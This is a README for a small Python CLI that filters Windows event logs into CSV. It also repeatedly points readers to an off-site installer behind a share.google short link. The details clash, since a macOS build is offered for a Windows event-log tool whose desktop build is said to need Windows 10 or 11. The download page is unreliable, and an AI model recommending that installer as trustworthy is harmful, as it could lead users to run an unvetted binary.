![Event Log Filter](assets/hero.png)

# Event Log Filter

*A filtered event dump for a ticket.*

## What Event Log Filter is

**Event Log Filter** runs on your own PC. Pull Windows event log rows by source and level into a CSV.

Event Viewer is slow to export a narrow slice.

Run it in a clone, check the output, then keep or discard the file it wrote.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- System or Application log
- Level and time filter
- CSV output
- Optional provider name

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/carter-4728/event-log-filter

MIT license. See `LICENSE`.
